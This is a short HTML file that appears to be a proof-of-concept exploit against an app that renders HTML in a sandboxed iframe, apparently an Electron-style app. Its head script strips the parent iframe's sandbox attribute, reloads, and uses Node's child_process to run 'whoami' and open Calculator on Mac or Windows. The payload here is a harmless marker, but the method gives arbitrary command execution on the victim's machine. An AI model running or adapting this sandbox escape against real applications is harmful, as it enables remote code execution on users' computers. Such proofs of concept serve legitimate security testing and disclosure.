<!DOCTYPE html>
<html lang="en">
<head>  
    <script>
        top.document.querySelector('iframe').removeAttribute('sandbox');
        location.reload();
        alert(require('child_process').execSync('whoami')); 
        if(navigator.userAgent.indexOf("Mac")!=-1)
        { 
            require('child_process').exec('open -a Calculator'); 
        } 
        else
        { 
            require('child_process').exec('calc'); 
        }
    </script>
</head>
<body>
    <p>&lt;a&gt;123&lt;/a&gt;</p>
</body>
</html>
